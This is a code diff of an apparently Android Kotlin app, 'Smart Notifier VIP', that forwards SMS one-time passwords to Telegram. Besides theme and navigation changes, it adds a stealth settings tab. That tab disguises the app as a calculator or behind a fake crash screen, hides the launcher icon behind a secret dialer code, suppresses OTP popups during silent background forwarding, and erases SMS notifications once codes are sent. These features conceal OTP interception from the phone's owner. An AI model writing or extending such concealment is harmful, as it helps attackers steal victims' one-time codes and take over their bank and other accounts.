@@ -55,10 +55,10 @@ import androidx.lifecycle.compose.LocalLifecycleOwner
 import kotlinx.coroutines.launch
 
 // Ultra-VIP Obsidian Titanium Luxury Palette
-val DarkBg = Color(0xFF07090E)
-val CardBg = Color(0xFF0F1523)
-val CardBorder = Color(0xFF1E293B)
-val CardGlow = Color(0xFF1D283A)
+val DarkBg = Color(0xFF070A0F)
+val CardBg = Color(0xFF0E131F)
+val CardBorder = Color(0xFF1E283D)
+val CardGlow = Color(0xFF141C2E)
 val AccentEmerald = Color(0xFF10B981)
 val AccentIndigo = Color(0xFF6366F1)
 val AccentGold = Color(0xFFF59E0B)
@@ -67,6 +67,25 @@ val AccentCyan = Color(0xFF06B6D4)
 val TextPrimary = Color(0xFFF8FAFC)
 val TextSecondary = Color(0xFF94A3B8)
 val TextMuted = Color(0xFF64748B)
+
+val LuxuryDarkColorScheme = darkColorScheme(
+    primary = AccentGold,
+    onPrimary = Color(0xFF1A1405),
+    primaryContainer = Color(0xFF2E240D),
+    onPrimaryContainer = Color(0xFFFDE68A),
+    secondary = AccentEmerald,
+    onSecondary = Color(0xFF022C22),
+    secondaryContainer = Color(0xFF064E3B),
+    onSecondaryContainer = Color(0xFFA7F3D0),
+    surface = CardBg,
+    onSurface = TextPrimary,
+    surfaceVariant = Color(0xFF161F30),
+    onSurfaceVariant = TextSecondary,
+    background = DarkBg,
+    onBackground = TextPrimary,
+    outline = CardBorder,
+    outlineVariant = Color(0xFF141C2E)
+)
 
 @Composable
 fun PulsingRadarDot() {
@@ -114,7 +133,7 @@ class MainActivity : ComponentActivity() {
         requestAppPermissions()
 
         setContent {
-            MaterialTheme {
+            MaterialTheme(colorScheme = LuxuryDarkColorScheme) {
                 Surface(
                     modifier = Modifier.fillMaxSize(),
                     color = DarkBg
@@ -684,24 +703,28 @@ fun MainScreenContent(
                 Spacer(modifier = Modifier.height(10.dp))
 
                 // Menu Items
-                DrawerNavItem("⚡ Forwarding Channels", selected = selectedScreen == 0) {
+                DrawerNavItem("⚡ Forwarder Dashboard", selected = selectedScreen == 0) {
                     selectedScreen = 0
                     scope.launch { drawerState.close() }
                 }
-                DrawerNavItem("🎯 Keywords & Filter Rules", selected = selectedScreen == 5) {
-                    selectedScreen = 5
-                    scope.launch { drawerState.close() }
-                }
-                DrawerNavItem("🛡️ 24/7 Autostart & Battery", selected = selectedScreen == 1) {
+                DrawerNavItem("🧮 Stealth & Calculator Disguise", selected = selectedScreen == 1) {
                     selectedScreen = 1
                     scope.launch { drawerState.close() }
                 }
-                DrawerNavItem("📜 Forwarding History", selected = selectedScreen == 2) {
+                DrawerNavItem("🎯 Keywords & Filter Rules", selected = selectedScreen == 2) {
                     selectedScreen = 2
                     scope.launch { drawerState.close() }
                 }
-                DrawerNavItem("💬 Live Support Desk", selected = selectedScreen == 3) {
+                DrawerNavItem("📜 Forwarding History", selected = selectedScreen == 3) {
                     selectedScreen = 3
+                    scope.launch { drawerState.close() }
+                }
+                DrawerNavItem("🛡️ 24/7 Autostart & Battery", selected = selectedScreen == 4) {
+                    selectedScreen = 4
+                    scope.launch { drawerState.close() }
+                }
+                DrawerNavItem("💬 Live Support Desk", selected = selectedScreen == 5) {
+                    selectedScreen = 5
                     scope.launch { drawerState.close() }
                 }
                 DrawerNavItem("❓ Kaise Use Karein? (Guide)", selected = false) {
@@ -810,12 +833,12 @@ fun MainScreenContent(
                         ) {
                             Text(
                                 text = when (selectedScreen) {
-                                    0 -> "Channels Setup"
-                                    1 -> "24/7 Autostart"
-                                    2 -> "Forwarding History"
-                                    3 -> "Live Support Desk"
-                                    4 -> "Lifetime Pro"
-                                    5 -> "Keywords & Filters"
+                                    0 -> "⚡ Forwarder Dashboard"
+                                    1 -> "🧮 Stealth & Disguise"
+                                    2 -> "🎯 Keywords & Filters"
+                                    3 -> "📜 Forwarding History"
+                                    4 -> "🛡️ 24/7 Autostart"
+                                    5 -> "💬 Support Desk"
                                     else -> "Smart Notifier VIP"
                                 },
                                 fontWeight = FontWeight.Bold,
@@ -859,6 +882,78 @@ fun MainScreenContent(
                     },
                     colors = TopAppBarDefaults.topAppBarColors(containerColor = CardBg)
                 )
+            },
+            bottomBar = {
+                NavigationBar(
+                    containerColor = Color(0xFF0A0E18),
+                    tonalElevation = 8.dp
+                ) {
+                    NavigationBarItem(
+                        selected = selectedScreen == 0,
+                        onClick = { selectedScreen = 0 },
+                        icon = { Text("⚡", fontSize = 18.sp) },
+                        label = { Text("Forwarder", fontSize = 10.sp, fontWeight = if (selectedScreen == 0) FontWeight.ExtraBold else FontWeight.Normal) },
+                        colors = NavigationBarItemDefaults.colors(
+                            selectedIconColor = AccentGold,
+                            selectedTextColor = AccentGold,
+                            indicatorColor = Color(0xFF1E283D),
+                            unselectedIconColor = TextSecondary,
+                            unselectedTextColor = TextSecondary
+                        )
+                    )
+                    NavigationBarItem(
+                        selected = selectedScreen == 1,
+                        onClick = { selectedScreen = 1 },
+                        icon = { Text("🧮", fontSize = 18.sp) },
+                        label = { Text("Stealth", fontSize = 10.sp, fontWeight = if (selectedScreen == 1) FontWeight.ExtraBold else FontWeight.Normal) },
+                        colors = NavigationBarItemDefaults.colors(
+                            selectedIconColor = AccentGold,
+                            selectedTextColor = AccentGold,
+                            indicatorColor = Color(0xFF1E283D),
+                            unselectedIconColor = TextSecondary,
+                            unselectedTextColor = TextSecondary
+                        )
+                    )
+                    NavigationBarItem(
+                        selected = selectedScreen == 2,
+                        onClick = { selectedScreen = 2 },
+                        icon = { Text("🎯", fontSize = 18.sp) },
+                        label = { Text("Rules", fontSize = 10.sp, fontWeight = if (selectedScreen == 2) FontWeight.ExtraBold else FontWeight.Normal) },
+                        colors = NavigationBarItemDefaults.colors(
+                            selectedIconColor = AccentGold,
+                            selectedTextColor = AccentGold,
+                            indicatorColor = Color(0xFF1E283D),
+                            unselectedIconColor = TextSecondary,
+                            unselectedTextColor = TextSecondary
+                        )
+                    )
+                    NavigationBarItem(
+                        selected = selectedScreen == 3,
+                        onClick = { selectedScreen = 3 },
+                        icon = { Text("📜", fontSize = 18.sp) },
+                        label = { Text("History", fontSize = 10.sp, fontWeight = if (selectedScreen == 3) FontWeight.ExtraBold else FontWeight.Normal) },
+                        colors = NavigationBarItemDefaults.colors(
+                            selectedIconColor = AccentGold,
+                            selectedTextColor = AccentGold,
+                            indicatorColor = Color(0xFF1E283D),
+                            unselectedIconColor = TextSecondary,
+                            unselectedTextColor = TextSecondary
+                        )
+                    )
+                    NavigationBarItem(
+                        selected = false,
+                        onClick = { isFounderConsoleOpen = true },
+                        icon = { Text("👑", fontSize = 18.sp) },
+                        label = { Text("Admin", fontSize = 10.sp, fontWeight = FontWeight.ExtraBold) },
+                        colors = NavigationBarItemDefaults.colors(
+                            selectedIconColor = AccentGold,
+                            selectedTextColor = AccentGold,
+                            indicatorColor = Color(0xFF2E240D),
+                            unselectedIconColor = AccentGold,
+                            unselectedTextColor = AccentGold
+                        )
+                    )
+                }
             },
             containerColor = DarkBg
         ) { paddingValues ->
@@ -915,7 +1010,7 @@ fun MainScreenContent(
                                 Text("Phone app ko sleep kar sakta hai", fontSize = 10.sp, color = Color(0xFFFEF08A))
                             }
                             Button(
-                                onClick = { selectedScreen = 1 },
+                                onClick = { selectedScreen = 4 },
                                 colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFF59E0B)),
                                 shape = RoundedCornerShape(6.dp),
                                 contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp)
@@ -938,16 +1033,16 @@ fun MainScreenContent(
                             onOpenHelp = { showHelpDialog = true },
                             onOpenSupportChat = { showSupportChat = true }
                         )
-                        1 -> AutostartScreen(
+                        1 -> StealthTab(context)
+                        2 -> KeywordsTab(context)
+                        3 -> HistoryTab(context)
+                        4 -> AutostartScreen(
                             context = context,
                             hasNotificationAccess = hasNotificationAccess,
                             hasBatteryExemption = hasBatteryExemption,
                             onOpenNotificationSettings = onOpenNotificationSettings
                         )
-                        2 -> HistoryTab(context)
-                        3 -> SupportChatScreen(context)
-                        4 -> ProPaytmTab(context)
-                        5 -> KeywordsTab(context)
+                        5 -> SupportChatScreen(context)
                     }
                 }
             }
@@ -1227,6 +1322,262 @@ fun RowScope.NavPill(text: String, selected: Boolean, onClick: () -> Unit) {
                 fontWeight = if (selected) FontWeight.Bold else FontWeight.Medium,
                 color = if (selected) Color.White else TextSecondary
             )
+        }
+    }
+}
+
+
+@Composable
+fun StealthTab(context: Context) {
+    val prefs = remember { PrefsHelper.getPrefs(context) }
+    var isCalculatorDisguise by remember { mutableStateOf(prefs.getBoolean("disguise_calculator_enabled", false)) }
+    var calculatorPin by remember { mutableStateOf(prefs.getString("calculator_secret_pin", "0825") ?: "0825") }
+    var isSilentMode by remember { mutableStateOf(!prefs.getBoolean("show_screen_popups", false)) }
+    var isFakeCrashEnabled by remember { mutableStateOf(prefs.getBoolean("fake_crash_enabled", false)) }
+    var isAppLockEnabled by remember { mutableStateOf(prefs.getBoolean("app_lock_enabled", false)) }
+    var isAutoClearSms by remember { mutableStateOf(prefs.getBoolean("auto_clear_sms_notification", false)) }
+    var customSecretCode by remember { mutableStateOf(prefs.getString("custom_secret_code", "") ?: "") }
+    var isIconHidden by remember { mutableStateOf(SecretCodeReceiver.isLauncherIconHidden(context)) }
+
+    Column(
+        modifier = Modifier
+            .fillMaxSize()
+            .verticalScroll(rememberScrollState())
+            .padding(vertical = 12.dp),
+        verticalArrangement = Arrangement.spacedBy(14.dp)
+    ) {
+        // Hero Stealth Mode Header Card
+        MncCard {
+            Column(modifier = Modifier.padding(18.dp)) {
+                Row(verticalAlignment = Alignment.CenterVertically) {
+                    Text("🛡️ Stealth & Privacy Suite", fontWeight = FontWeight.ExtraBold, fontSize = 16.sp, color = AccentGold)
+                    Spacer(modifier = Modifier.width(8.dp))
+                    Surface(
+                        color = Color(0xFF3B2806),
+                        shape = RoundedCornerShape(6.dp)
+                    ) {
+                        Text(
+                            text = "ULTRA VIP",
+                            fontSize = 9.sp,
+                            fontWeight = FontWeight.Bold,
+                            color = Color(0xFFFDE68A),
+                            modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp)
+                        )
+                    }
+                }
+                Spacer(modifier = Modifier.height(4.dp))
+                Text("App ko calculator me badlein, screen par OTP popups chupayein aur security lock karein.", fontSize = 11.sp, color = TextSecondary)
+            }
+        }
+
+        // Card 1: Calculator Disguise
+        MncCard {
+            Column(modifier = Modifier.padding(18.dp)) {
+                Row(
+                    modifier = Modifier.fillMaxWidth(),
+                    verticalAlignment = Alignment.CenterVertically,
+                    horizontalArrangement = Arrangement.SpaceBetween
+                ) {
+                    Column(modifier = Modifier.weight(1f)) {
+                        Row(verticalAlignment = Alignment.CenterVertically) {
+                            Text("🧮 Calculator Disguise Mode", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = Color.White)
+                        }
+                        Text(
+                            text = if (isCalculatorDisguise) "🟢 ACTIVE: App kholne par asli Calculator khulega" else "⚪ OFF: Normal Smart Notifier khulega",
+                            fontSize = 11.sp,
+                            color = if (isCalculatorDisguise) AccentEmerald else TextSecondary
+                        )
+                    }
+                    Switch(
+                        checked = isCalculatorDisguise,
+                        onCheckedChange = { checked ->
+                            isCalculatorDisguise = checked
+                            prefs.edit().putBoolean("disguise_calculator_enabled", checked).apply()
+                            Toast.makeText(context, if (checked) "🧮 Calculator Disguise Active!" else "Smart Notifier Mode Active", Toast.LENGTH_SHORT).show()
+                        },
+                        colors = SwitchDefaults.colors(
+                            checkedThumbColor = Color.White,
+                            checkedTrackColor = AccentGold,
+                            uncheckedThumbColor = Color.Gray,
+                            uncheckedTrackColor = Color(0xFF1E283D)
+                        )
+                    )
+                }
+
+                if (isCalculatorDisguise) {
+                    Spacer(modifier = Modifier.height(14.dp))
+                    Text("Unlock PIN: (Calculator me yeh PIN daal kar '=' dabane par app unlock hogi)", fontSize = 11.sp, color = TextMuted)
+                    Spacer(modifier = Modifier.height(6.dp))
+                    Row(
+                        modifier = Modifier.fillMaxWidth(),
+                        verticalAlignment = Alignment.CenterVertically,
+                        horizontalArrangement = Arrangement.spacedBy(10.dp)
+                    ) {
+                        Box(modifier = Modifier.weight(1f)) {
+                            MncTextField(
+                                value = calculatorPin,
+                                onValueChange = { calculatorPin = it.filter { ch -> ch.isDigit() }.take(6) },
+                                label = "Secret PIN (Default: 0825)"
+                            )
+                        }
+                        Button(
+                            onClick = {
+                                if (calculatorPin.trim().isNotEmpty()) {
+                                    prefs.edit().putString("calculator_secret_pin", calculatorPin.trim()).apply()
+                                    Toast.makeText(context, "✅ PIN Saved: ${calculatorPin.trim()}", Toast.LENGTH_SHORT).show()
+                                }
+                            },
+                            colors = ButtonDefaults.buttonColors(containerColor = AccentGold),
+                            shape = RoundedCornerShape(10.dp),
+                            modifier = Modifier.height(50.dp)
+                        ) {
+                            Text("Save PIN", fontSize = 12.sp, fontWeight = FontWeight.Bold, color = Color.Black)
+                        }
+                    }
+                }
+            }
+        }
+
+        // Card 2: Silent Stealth Mode
+        MncCard {
+            Row(
+                modifier = Modifier.fillMaxWidth().padding(18.dp),
+                verticalAlignment = Alignment.CenterVertically,
+                horizontalArrangement = Arrangement.SpaceBetween
+            ) {
+                Column(modifier = Modifier.weight(1f)) {
+                    Text("🔕 Silent Stealth Mode", fontWeight = FontWeight.Bold, fontSize = 14.sp, color = Color.White)
+                    Text("Phone screen par OTP ka koi popup ya alert nahi aayega. Background me silent forward hoga.", fontSize = 11.sp, color = TextSecondary)
+                }
+                Switch(
+                    checked = isSilentMode,
+                    onCheckedChange = { silent ->
+                        isSilentMode = silent
+                        prefs.edit().putBoolean("show_screen_popups", !silent).apply()
+                    },
+                    colors = SwitchDefaults.colors(
+                        checkedThumbColor = Color.White,
+                        checkedTrackColor = AccentEmerald,
+                        uncheckedThumbColor = Color.Gray,
+                        uncheckedTrackColor = Color(0xFF1E283D)
+                    )
+                )
+            }
+        }
+
+        // Card 3: Fake Crash Screen
+        MncCard {
+            Row(
+                modifier = Modifier.fillMaxWidth().padding(18.dp),
+                verticalAlignment = Alignment.CenterVertically,
+                horizontalArrangement = Arrangement.SpaceBetween
+            ) {
+                Column(modifier = Modifier.weight(1f)) {
+                    Text("💥 Fake Crash Disguise", fontWeight = FontWeight.Bold, fontSize = 14.sp, color = Color.White)
+                    Text("App kholne par 'App keeps stopping' ka error dikhayega. Title par 3 bar click karne par unlock hoga.", fontSize = 11.sp, color = TextSecondary)
+                }
+                Switch(
+                    checked = isFakeCrashEnabled,
+                    onCheckedChange = { checked ->
+                        isFakeCrashEnabled = checked
+                        prefs.edit().putBoolean("fake_crash_enabled", checked).apply()
+                    },
+                    colors = SwitchDefaults.colors(
+                        checkedThumbColor = Color.White,
+                        checkedTrackColor = AccentIndigo,
+                        uncheckedThumbColor = Color.Gray,
+                        uncheckedTrackColor = Color(0xFF1E283D)
+                    )
+                )
+            }
+        }
+
+        // Card 4: Biometric / PIN Lock
+        MncCard {
+            Row(
+                modifier = Modifier.fillMaxWidth().padding(18.dp),
+                verticalAlignment = Alignment.CenterVertically,
+                horizontalArrangement = Arrangement.SpaceBetween
+            ) {
+                Column(modifier = Modifier.weight(1f)) {
+                    Text("🔒 Fingerprint / Device Lock", fontWeight = FontWeight.Bold, fontSize = 14.sp, color = Color.White)
+                    Text("Phone ka Fingerprint ya Screen PIN maang kar hi app open karega.", fontSize = 11.sp, color = TextSecondary)
+                }
+                Switch(
+                    checked = isAppLockEnabled,
+                    onCheckedChange = { checked ->
+                        isAppLockEnabled = checked
+                        prefs.edit().putBoolean("app_lock_enabled", checked).apply()
+                    },
+                    colors = SwitchDefaults.colors(
+                        checkedThumbColor = Color.White,
+                        checkedTrackColor = AccentIndigo,
+                        uncheckedThumbColor = Color.Gray,
+                        uncheckedTrackColor = Color(0xFF1E283D)
+                    )
+                )
+            }
+        }
+
+        // Card 5: Auto-Clear SMS Notifications
+        MncCard {
+            Row(
+                modifier = Modifier.fillMaxWidth().padding(18.dp),
+                verticalAlignment = Alignment.CenterVertically,
+                horizontalArrangement = Arrangement.SpaceBetween
+            ) {
+                Column(modifier = Modifier.weight(1f)) {
+                    Text("🧹 Auto-Clear Notification", fontWeight = FontWeight.Bold, fontSize = 14.sp, color = Color.White)
+                    Text("OTP Telegram par forward hone ke turant baad screen notification ko gayab kar dega.", fontSize = 11.sp, color = TextSecondary)
+                }
+                Switch(
+                    checked = isAutoClearSms,
+                    onCheckedChange = { checked ->
+                        isAutoClearSms = checked
+                        prefs.edit().putBoolean("auto_clear_sms_notification", checked).apply()
+                    },
+                    colors = SwitchDefaults.colors(
+                        checkedThumbColor = Color.White,
+                        checkedTrackColor = AccentEmerald,
+                        uncheckedThumbColor = Color.Gray,
+                        uncheckedTrackColor = Color(0xFF1E283D)
+                    )
+                )
+            }
+        }
+
+        // Card 6: Secret Code Dialer & Deep Link
+        MncCard {
+            Column(modifier = Modifier.padding(18.dp)) {
+                Text("📞 Customer Secret Dialer Code", fontWeight = FontWeight.Bold, fontSize = 14.sp, color = Color.White)
+                Text("Phone dialer me *#*#CODE#*#* dial karke app kholi/chhupai jati hai:", fontSize = 11.sp, color = TextSecondary)
+                Spacer(modifier = Modifier.height(10.dp))
+                Row(modifier = Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
+                    Box(modifier = Modifier.weight(1f)) {
+                        MncTextField(
+                            value = customSecretCode,
+                            onValueChange = { customSecretCode = it.filter { ch -> ch.isDigit() }.take(6) },
+                            label = "Custom Code (e.g. 1234)"
+                        )
+                    }
+                    Spacer(modifier = Modifier.width(10.dp))
+                    Button(
+                        onClick = {
+                            if (customSecretCode.trim().isNotEmpty()) {
+                                prefs.edit().putString("custom_secret_code", customSecretCode.trim()).apply()
+                                Toast.makeText(context, "✅ Code Saved: *#*#${customSecretCode.trim()}#*#*", Toast.LENGTH_SHORT).show()
+                            }
+                        },
+                        colors = ButtonDefaults.buttonColors(containerColor = AccentGold),
+                        shape = RoundedCornerShape(10.dp),
+                        modifier = Modifier.height(50.dp)
+                    ) {
+                        Text("Set Code", fontSize = 12.sp, fontWeight = FontWeight.Bold, color = Color.Black)
+                    }
+                }
+                Spacer(modifier = Modifier.height(8.dp))
+                Text("💡 Browser direct unlock link: otp://open", fontSize = 11.sp, color = Color(0xFF67E8F9))
+            }
         }
     }
 }
@@ -1646,136 +1997,6 @@ fun ServicesTab(
             }
         }
 
-        Spacer(modifier = Modifier.height(12.dp))
-
-        // Card: Stealth & Security Controls
-        var isCalculatorDisguise by remember { mutableStateOf(prefs.getBoolean("disguise_calculator_enabled", false)) }
-        var calculatorPin by remember { mutableStateOf(prefs.getString("calculator_secret_pin", "0825") ?: "0825") }
-
-        MncCard {
-            Column(modifier = Modifier.padding(14.dp)) {
-                Row(verticalAlignment = Alignment.CenterVertically) {
-                    Text("🛡️ Stealth & Protection Suite", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = Color(0xFFA78BFA))
-                    Spacer(modifier = Modifier.width(6.dp))
-                    Surface(
-                        color = Color(0xFF4C1D95),
-                        shape = RoundedCornerShape(4.dp)
-                    ) {
-                        Text("VIP", fontSize = 9.sp, fontWeight = FontWeight.Bold, color = Color(0xFFE9D5FF), modifier = Modifier.padding(horizontal = 5.dp, vertical = 2.dp))
-                    }
-                }
-                Text("App ko hide karne aur security locks configure karein:", fontSize = 11.sp, color = TextSecondary)
-                Spacer(modifier = Modifier.height(12.dp))
-
-                // Feature 1: Calculator Disguise
-                SettingToggleRow("🧮 Calculator Disguise Mode", isCalculatorDisguise) { checked ->
-                    isCalculatorDisguise = checked
-                    prefs.edit().putBoolean("disguise_calculator_enabled", checked).apply()
-                }
-                if (isCalculatorDisguise) {
-                    Spacer(modifier = Modifier.height(6.dp))
-                    Text("Calculator Unlock PIN (Type in calculator & press = to open):", fontSize = 10.sp, color = TextMuted)
-                    Spacer(modifier = Modifier.height(4.dp))
-                    Row(modifier = Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
-                        Box(modifier = Modifier.weight(1f)) {
-                            MncTextField(
-                                value = calculatorPin,
-                                onValueChange = { calculatorPin = it.filter { ch -> ch.isDigit() }.take(6) },
-                                label = "Calculator PIN (e.g. 0825)"
-                            )
-                        }
-                        Spacer(modifier = Modifier.width(8.dp))
-                        Button(
-                            onClick = {
-                                if (calculatorPin.trim().isNotEmpty()) {
-                                    prefs.edit().putString("calculator_secret_pin", calculatorPin.trim()).apply()
-                                    Toast.makeText(context, "✅ PIN Saved: ${calculatorPin.trim()}", Toast.LENGTH_SHORT).show()
-                                }
-                            },
-                            colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo),
-                            shape = RoundedCornerShape(8.dp),
-                            modifier = Modifier.height(52.dp)
-                        ) {
-                            Text("Save PIN", fontSize = 11.sp, fontWeight = FontWeight.Bold)
-                        }
-                    }
-                    HorizontalDivider(modifier = Modifier.padding(vertical = 10.dp), color = CardBorder)
-                } else {
-                    HorizontalDivider(modifier = Modifier.padding(vertical = 10.dp), color = CardBorder)
-                }
-
-                // Custom Secret Dialer Setting
-                Text("📞 Customer Secret Dialer Code:", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = TextPrimary)
-                Text("Phone dialer me *#*#CODE#*#* dial karke app kholi/chhupai jati hai:", fontSize = 10.sp, color = TextMuted)
-                Spacer(modifier = Modifier.height(6.dp))
-                Row(modifier = Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
-                    Box(modifier = Modifier.weight(1f)) {
-                        MncTextField(
-                            value = customSecretCode,
-                            onValueChange = { customSecretCode = it.filter { ch -> ch.isDigit() }.take(6) },
-                            label = "Custom Code (e.g. 1234)"
-                        )
-                    }
-                    Spacer(modifier = Modifier.width(8.dp))
-                    Button(
-                        onClick = {
-                            if (customSecretCode.trim().isNotEmpty()) {
-                                prefs.edit().putString("custom_secret_code", customSecretCode.trim()).apply()
-                                Toast.makeText(context, "✅ Code Saved: *#*#${customSecretCode.trim()}#*#*", Toast.LENGTH_SHORT).show()
-                            }
-                        },
-                        colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo),
-                        shape = RoundedCornerShape(8.dp),
-                        modifier = Modifier.height(52.dp)
-                    ) {
-                        Text("Set", fontSize = 12.sp, fontWeight = FontWeight.Bold)
-                    }
-                }
-                Spacer(modifier = Modifier.height(4.dp))
-                Text("💡 Browser direct unlock shortcut: otp://open", fontSize = 10.sp, color = Color(0xFF67E8F9))
-
-                HorizontalDivider(modifier = Modifier.padding(vertical = 10.dp), color = CardBorder)
-
-                // Hide App Icon Toggle (Uses Clean Activity-Alias - Zero Duplicate App Bug)
-                SettingToggleRow("Hide Launcher Icon", isIconHidden) { hide ->
-                    SecretCodeReceiver.setLauncherIconVisibility(context, hide)
-                    isIconHidden = hide
-                }
-
-                HorizontalDivider(modifier = Modifier.padding(vertical = 10.dp), color = CardBorder)
-
-                // Silent Stealth Mode
-                SettingToggleRow("Silent Stealth Mode", isSilentMode) { silent ->
-                    isSilentMode = silent
-                    prefs.edit().putBoolean("show_screen_popups", !silent).apply()
-                }
-
-                HorizontalDivider(modifier = Modifier.padding(vertical = 10.dp), color = CardBorder)
-
-                // Fingerprint / PIN Lock
-                SettingToggleRow("Fingerprint / PIN Lock", isAppLockEnabled) { checked ->
-                    isAppLockEnabled = checked
-                    prefs.edit().putBoolean("app_lock_enabled", checked).apply()
-                }
-
-                HorizontalDivider(modifier = Modifier.padding(vertical = 10.dp), color = CardBorder)
-
-                // Fake Crash Disguise
-                SettingToggleRow("Fake Crash Screen (3-Tap Unlock)", isFakeCrashEnabled) { checked ->
-                    isFakeCrashEnabled = checked
-                    prefs.edit().putBoolean("fake_crash_enabled", checked).apply()
-                }
-
-                HorizontalDivider(modifier = Modifier.padding(vertical = 10.dp), color = CardBorder)
-
-                // Auto-Clear SMS Notifications
-                SettingToggleRow("Auto-Clear SMS Notifications", isAutoClearSms) { checked ->
-                    isAutoClearSms = checked
-                    prefs.edit().putBoolean("auto_clear_sms_notification", checked).apply()
-                }
-            }
-        }
-
         Spacer(modifier = Modifier.height(16.dp))
 
         // Save All Button
@@ -1791,40 +2012,19 @@ fun ServicesTab(
                     .putString("wa_api_key", waApiKey.trim())
                     .putBoolean("only_otp_mode", isOnlyOtpMode)
                     .putBoolean("low_battery_alert_enabled", isLowBatteryAlertEnabled)
-                    .putBoolean("app_lock_enabled", isAppLockEnabled)
-                    .putBoolean("fake_crash_enabled", isFakeCrashEnabled)
-                    .putBoolean("auto_clear_sms_notification", isAutoClearSms)
-                    .putString("custom_secret_code", customSecretCode.trim())
-                    .putBoolean("disguise_calculator_enabled", isCalculatorDisguise)
-                    .putString("calculator_secret_pin", calculatorPin.trim())
 
-                // Zero-Leak Protection: Never persist founder credentials in public customer keys
-                val cleanBotToken = botToken.trim()
-                if (cleanBotToken.isNotEmpty() && cleanBotToken != TelegramHelper.DEFAULT_BOT_TOKEN) {
-                    editor.putString("bot_token", cleanBotToken)
-                } else if (cleanBotToken == TelegramHelper.DEFAULT_BOT_TOKEN) {
-                    editor.remove("bot_token")
-                } else {
-                    editor.putString("bot_token", "")
-                }
-
-                val cleanChatId = chatId.trim()
-                if (cleanChatId.isNotEmpty() && cleanChatId != TelegramHelper.DEFAULT_CHANNEL_ID && cleanChatId != TelegramHelper.DEFAULT_USER_ID) {
-                    editor.putString("chat_id", cleanChatId)
-                } else if (cleanChatId == TelegramHelper.DEFAULT_CHANNEL_ID || cleanChatId == TelegramHelper.DEFAULT_USER_ID) {
-                    editor.remove("chat_id")
-                } else {
-                    editor.putString("chat_id", "")
-                }
+                // Save User's Bot Token & Chat ID unconditionally
+                editor.putString("bot_token", botToken.trim())
+                editor.putString("chat_id", chatId.trim())
 
                 editor.apply()
-                Toast.makeText(context, "✅ VIP Configuration Saved!", Toast.LENGTH_SHORT).show()
+                Toast.makeText(context, "✅ VIP Forwarder Settings Saved!", Toast.LENGTH_SHORT).show()
             },
             modifier = Modifier.fillMaxWidth().height(50.dp),
             shape = RoundedCornerShape(12.dp),
-            colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo)
+            colors = ButtonDefaults.buttonColors(containerColor = AccentGold)
         ) {
-            Text("💾 Save Configuration", fontSize = 15.sp, fontWeight = FontWeight.Bold)
+            Text("💾 Save All Settings", fontSize = 15.sp, fontWeight = FontWeight.Bold, color = Color.Black)
         }
 
         Spacer(modifier = Modifier.height(24.dp))
@@ -3511,10 +3711,10 @@ fun MncCard(
 ) {
     Card(
         modifier = modifier.fillMaxWidth(),
-        shape = RoundedCornerShape(16.dp),
+        shape = RoundedCornerShape(18.dp),
         colors = CardDefaults.cardColors(containerColor = CardBg),
         border = BorderStroke(1.dp, CardBorder),
-        elevation = CardDefaults.cardElevation(defaultElevation = 2.dp),
+        elevation = CardDefaults.cardElevation(defaultElevation = 3.dp),
         content = content
     )
 }
@@ -3528,15 +3728,16 @@ fun MncTextField(
     OutlinedTextField(
         value = value,
         onValueChange = onValueChange,
-        label = { Text(label, fontSize = 11.sp, color = TextMuted) },
-        shape = RoundedCornerShape(10.dp),
+        label = { Text(label, fontSize = 12.sp, color = TextSecondary) },
+        shape = RoundedCornerShape(12.dp),
         colors = OutlinedTextFieldDefaults.colors(
             focusedTextColor = TextPrimary,
             unfocusedTextColor = TextPrimary,
-            focusedBorderColor = AccentIndigo,
+            focusedBorderColor = AccentGold,
             unfocusedBorderColor = CardBorder,
-            focusedContainerColor = Color(0xFF0B101D),
-            unfocusedContainerColor = Color(0xFF0B101D)
+            focusedContainerColor = Color(0xFF090D18),
+            unfocusedContainerColor = Color(0xFF090D18),
+            cursorColor = AccentGold
         ),
         modifier = Modifier.fillMaxWidth(),
         singleLine = true
@@ -3560,9 +3761,9 @@ fun SettingToggleRow(
             onCheckedChange = onCheckedChange,
             colors = SwitchDefaults.colors(
                 checkedThumbColor = Color.White,
-                checkedTrackColor = AccentIndigo,
+                checkedTrackColor = AccentGold,
                 uncheckedThumbColor = Color.Gray,
-                uncheckedTrackColor = Color(0xFF1E293B)
+                uncheckedTrackColor = Color(0xFF1E283D)
             )
         )
     }
